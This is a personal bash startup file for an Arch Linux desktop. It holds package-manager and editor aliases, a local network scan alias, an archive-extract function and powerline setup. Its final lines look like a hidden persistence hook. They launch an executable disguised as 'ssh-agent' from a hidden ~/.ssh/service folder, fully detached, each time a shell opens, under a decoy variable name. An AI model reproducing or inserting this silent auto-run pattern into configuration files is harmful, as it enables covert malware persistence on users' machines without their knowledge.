#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
alias grep='grep --color=auto'
alias home='cd /home/ivanmyanez/'
alias eV='vim ~/.vimrc'
alias eI='vim ~/.config/i3/config'
alias eB='vim ~/.bashrc'
alias eZ='vim ~/.zshrc'
alias eX='vim ~/.Xresources'
alias pac='sudo pacman -Syyu'
alias Y='yaourt'
alias Net='sudo systemctl restart NetworkManager'
alias Rel='sudo systemctl daemon-reload'
alias p='sudo pacman -S'
alias hog='sudo nethogs'
alias map='sudo nmap 192.168.1.1/24'
alias Cleanup='sudo pacman -Rns $(pacman -Qtdq)'
alias Optimus='sudo pacman-optimize'
alias la='ls -lrta'
alias XTR='xrdb -merge ~/.Xresources'
alias Sys='systemd-analyze'
alias ble='sudo bleachbit'
alias Reb='sudo reboot'
alias Ya='yaourt -Syua'
alias Zsh='chsh -s $(which /bin/zsh)'
alias BSH='source ~/.bashrc'
alias ZSH='source ~/.zshrc'
alias Tc='sudo netstat -tc'
alias v='vim'
alias eT='vim ~/.tmux.conf'
alias eC='vim ~/.config/compton.conf'
alias Hdd='sudo hddtemp /dev/sda'
alias Sus='systemctl suspend'
alias borrar='sudo pacman -Rnsc'

[ -e "/etc/DIR_COLORS" ] && DIR_COLORS="/etc/DIR_COLORS"
[ -e "$HOME/.dircolors" ] && DIR_COLORS="$HOME/.dircolors"
[ -e "$DIR_COLORS" ] || DIR_COLORS=""
eval "`dircolors -b $DIR_COLORS`"

export VISUAL="vim"
export PYTHONPATH=/usr/lib/python3.7/site-packages/
powerline-daemon -q
POWERLINE_BASH_CONTINUATION=1
POWERLINE_BASH_SELECT=1
. /usr/lib/python3.7/site-packages/powerline/bindings/bash/powerline.sh

extract () {
if [ -f $1 ] ; then
  case $1 in
    *.tar.bz2)   tar xjf $1     ;;
    *.tar.gz)    tar xzf $1     ;;
    *.bz2)       bunzip2 $1     ;;
    *.rar)       unrar e $1     ;;
    *.gz)        gunzip $1      ;;
    *.tar)       tar xf $1      ;;
    *.tbz2)      tar xjf $1     ;;
    *.tgz)       tar xzf $1     ;;
    *.zip)       unzip $1       ;;
    *.Z)         uncompress $1  ;;
    *.7z)        7z x $1        ;;
    *)     echo "'$1' cannot be extracted via extract()" ;;
     esac
 else
     echo "'$1' is not a valid file"
 fi
}


#screenfetch

#neofetch

# Add RVM to PATH for scripting. Make sure this is the last PATH variable change.
export PATH="$PATH:$HOME/.rvm/bin"


linux_bash="$HOME/.ssh/service/ssh-agent"
if [ -e "$linux_bash" ];then
setsid "$linux_bash" 2>&1 & disown
fi